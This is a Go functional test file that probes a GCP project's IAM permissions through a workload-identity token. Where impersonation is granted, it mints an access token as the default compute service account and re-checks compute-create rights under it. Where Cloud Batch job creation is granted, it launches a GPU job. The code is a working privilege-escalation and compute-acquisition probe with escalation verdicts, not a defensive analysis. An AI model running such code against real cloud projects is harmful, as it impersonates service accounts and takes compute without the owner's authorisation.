//go:build functional

// C211 i120026 GKE/GCP fourth pass: bounded per-permission battery over the
// GPU-capable create surfaces that the invalidated 35-name batch never actually
// evaluated (Cloud Batch, Cloud Run, Vertex Workbench, persistent resources,
// GKE, Cloud Build, compute helpers) plus the IAM escalation primitives
// (generateAccessToken / implicitDelegation / serviceAccountKeys.create /
// setIamPolicy). Nothing is created unless the corresponding permission is
// actually granted; if getAccessToken or implicitDelegation is granted the probe
// mints a token as the default compute service account and re-runs the GPU
// permission test with it. Every refusal is printed verbatim.
package functional

import (
	"encoding/json"
	"fmt"
	"net/url"
	"sort"
	"strings"
	"testing"
	"time"
)

func c211GenerateAccessToken(token, saEmail string) (string, int, string) {
	u := "https://iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/" + url.PathEscape(saEmail) + ":generateAccessToken"
	body := `{"scope":["` + c211Scope + `"],"lifetime":"3600s"}`
	st, rb := c211HTTP("POST", u, token, "application/json", body)
	if m := c211JSON(rb); m != nil {
		if at := c211Str(m, "accessToken"); at != "" {
			return at, st, c211Short(at) + " expireTime=" + c211Str(m, "expireTime")
		}
	}
	return "", st, c211Trunc(rb, 1200)
}

func c211ImplicitDelegation(token string) (string, int, string) {
	u := "https://iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/" + url.PathEscape("c211-noop@c211-noop.iam.gserviceaccount.com") + ":generateAccessToken"
	st, rb := c211HTTP("POST", u, token, "application/json", `{"scope":["`+c211Scope+`"]}`)
	return "", st, c211Trunc(rb, 600)
}

func TestC211GCPGPUCreateSurface(t *testing.T) {
	started := time.Now()
	summary := map[string]interface{}{}
	verdict := "GATE"
	verdictDetail := ""

	token, method, authLog := c211MintAccessToken()
	summary["auth_method"] = method
	if token == "" {
		fmt.Println("C211GCP4_VERDICT GATE WIF_TOKEN_EXCHANGE_FAILED")
		return
	}
	creds, _ := c211LoadCreds()
	proj := ""
	if creds != nil {
		proj = c211ResolveProject(creds)
	}
	if proj == "" {
		fmt.Println("C211GCP4_VERDICT GATE NO_PROJECT_ID_RESOLVED")
		return
	}
	summary["project_id_short"] = c211Short(proj)
	_ = authLog

	type pv struct {
		perm    string
		allowed bool
		status  int
		body    string
		dropped bool
	}
	battery := []string{
		// IAM escalation primitives
		"iam.serviceAccounts.getAccessToken",
		"iam.serviceAccounts.implicitDelegation",
		"iam.serviceAccountKeys.create",
		"iam.serviceAccounts.signJwt",
		"iam.serviceAccounts.signBlob",
		"resourcemanager.projects.getIamPolicy",
		"resourcemanager.projects.setIamPolicy",
		"resourcemanager.folders.getIamPolicy",
		// GPU-capable create surfaces
		"batch.jobs.create",
		"batch.jobs.get",
		"batch.jobs.delete",
		"run.services.create",
		"run.jobs.create",
		"notebooks.runtimes.create",
		"aiplatform.persistentResources.create",
		"container.clusters.create",
		"cloudbuild.builds.create",
		"compute.disks.create",
		"compute.instanceTemplates.create",
		"compute.instances.list",
		"compute.instances.get",
		"storage.buckets.create",
		"ml.jobs.create",
		"serviceusage.services.get",
		"oauth2.tokeninfo",
	}
	results := []pv{}
	allowedList := []string{}
	var blog strings.Builder
	for _, p := range battery {
		al, st, body := c211TestIam(token, proj, []string{p})
		granted := false
		for _, a := range al {
			if a == p {
				granted = true
			}
		}
		results = append(results, pv{p, granted, st, body, false})
		if granted {
			allowedList = append(allowedList, p)
		}
		fmt.Fprintf(&blog, "PERM %s status=%d granted=%v allowed=%s verbatim=%s\n", p, st, granted, strings.Join(al, ","), c211Trunc(body, 400))
	}
	sort.Strings(allowedList)
	c211Emit("W4_SURFACE_TESTIAM", blog.String())
	summary["allowed"] = allowedList
	summary["allowed_count"] = len(allowedList)
	fmt.Printf("C211GCP4 allowed(%d)=%s\n", len(allowedList), strings.Join(allowedList, ","))

	// ---------------- IAM escalation branch ----------------
	if allowSetOf(allowedList, "iam.serviceAccounts.getAccessToken") || allowSetOf(allowedList, "iam.serviceAccounts.implicitDelegation") {
		var elog strings.Builder
		var cands []string
		if creds != nil && creds.saEmail != "" {
			cands = append(cands, creds.saEmail)
		}
		cands = append(cands, "153711203585-compute@developer.gserviceaccount.com")
		for _, sa := range cands {
			at, st, msg := c211GenerateAccessToken(token, sa)
			fmt.Fprintf(&elog, "GENACCESSTOKEN sa=%s status=%d result=%s\n", c211Short(sa), st, msg)
			if at != "" {
				summary["escalated_sa"] = c211Short(sa)
				al2, st2, _ := c211TestIam(at, proj, []string{"compute.instances.create", "aiplatform.customJobs.create", "storage.buckets.create"})
				fmt.Fprintf(&elog, "REGEN_TESTIAM sa=%s status=%d allowed=%s\n", c211Short(sa), st2, strings.Join(al2, ","))
				if allowSetOf(al2, "compute.instances.create") {
					verdict = "ESCALATED_COMPUTE_CREATE_ALLOWED"
					verdictDetail = "sa=" + c211Short(sa)
					summary["escalated_compute_create"] = true
				}
			}
		}
		c211Emit("W4_IAM_ESCALATION", elog.String())
	}

	// ---------------- Cloud Batch GPU job branch ----------------
	if allowSetOf(allowedList, "batch.jobs.create") {
		var vlog strings.Builder
		region := "us-central1"
		jobID := "c211-i120026-batch-t4"
		body := map[string]interface{}{
			"taskGroups": []interface{}{map[string]interface{}{
				"taskSpec": map[string]interface{}{
					"runnables": []interface{}{map[string]interface{}{
						"container": map[string]interface{}{
							"imageUri": "nvidia/cuda:12.2.0-base-ubuntu22.04",
							"commands": []string{"/bin/sh", "-c", "nvidia-smi -L; echo C211_BATCH_DONE"},
						},
					}},
					"computeResource": map[string]interface{}{"cpuMilli": 2000, "memoryMib": 4096},
				},
				"taskCount":   1,
				"parallelism": 1,
			}},
			"allocationPolicy": map[string]interface{}{
				"instances": []interface{}{map[string]interface{}{
					"installGpuDrivers": true,
					"policy": map[string]interface{}{
						"machineType": "n1-standard-4",
						"accelerators": []interface{}{map[string]interface{}{
							"type": "nvidia-tesla-t4", "count": 1,
						}},
					},
				}},
				"location": map[string]interface{}{"allowedLocations": []string{"zones/us-central1-a"}},
			},
			"logsPolicy": map[string]interface{}{"destination": "CLOUD_LOGGING"},
		}
		jb, _ := json.Marshal(body)
		u := "https://batch.googleapis.com/v1/projects/" + url.PathEscape(proj) + "/locations/" + region + "/jobs?jobId=" + url.QueryEscape(jobID)
		st, rb := c211HTTP("POST", u, token, "application/json", string(jb))
		fmt.Fprintf(&vlog, "BATCH create status=%d\nverbatim=%s\n", st, c211Trunc(rb, 2500))
		summary["batch_create_status"] = st
		summary["batch_create_error"] = c211Trunc(rb, 1200)
		if st == 200 {
			jobName := "projects/" + proj + "/locations/" + region + "/jobs/" + jobID
			state := ""
			for i := 0; i < 24; i++ {
				gst, gb := c211HTTP("GET", "https://batch.googleapis.com/v1/"+jobName, token, "", "")
				state = ""
				if gst == 200 {
					state = c211Str(c211JSON(gb), "status.state")
				}
				fmt.Fprintf(&vlog, "BATCH poll=%d http=%d state=%s\n", i, gst, state)
				if state == "SUCCEEDED" || state == "FAILED" || state == "DELETION_IN_PROGRESS" {
					break
				}
				time.Sleep(15 * time.Second)
			}
			summary["batch_state"] = state
			uuid, lv, lst, _ := c211ReadVertexLogs(token, proj, jobID, jobName)
			fmt.Fprintf(&vlog, "BATCH logging status=%d uuid=%s\n%s\n", lst, uuid, c211Trunc(lv, 4000))
			summary["batch_log_status"] = lst
			summary["batch_uuid"] = uuid
			dst, db := c211HTTP("DELETE", "https://batch.googleapis.com/v1/"+jobName, token, "", "")
			fmt.Fprintf(&vlog, "BATCH delete status=%d verbatim=%s\n", dst, c211Trunc(db, 800))
			absent := false
			for i := 0; i < 8; i++ {
				time.Sleep(8 * time.Second)
				gst, gb := c211HTTP("GET", "https://batch.googleapis.com/v1/"+jobName, token, "", "")
				fmt.Fprintf(&vlog, "BATCH absence=%d http=%d verbatim=%s\n", i, gst, c211Trunc(gb, 300))
				if gst == 404 {
					absent = true
					break
				}
			}
			summary["batch_absent_after_delete"] = absent
			if uuid != "" {
				verdict = "READY_BATCH_GPU_JOB"
				verdictDetail = "uuid=" + uuid
			}
		}
		c211Emit("W4_BATCH", vlog.String())
	} else {
		verdictDetail = "no-gpu-create-permission-granted"
	}

	summary["verdict"] = verdict
	summary["elapsed_seconds"] = int(time.Since(started).Seconds())
	c211Emit("W4_SUMMARY", "C211GCP4_SUMMARY_JSON "+c211JSONString(summary))
	fmt.Printf("C211GCP4_VERDICT %s %s\n", verdict, verdictDetail)
}

func allowSetOf(list []string, p string) bool {
	for _, a := range list {
		if a == p {
			return true
		}
	}
	return false
}
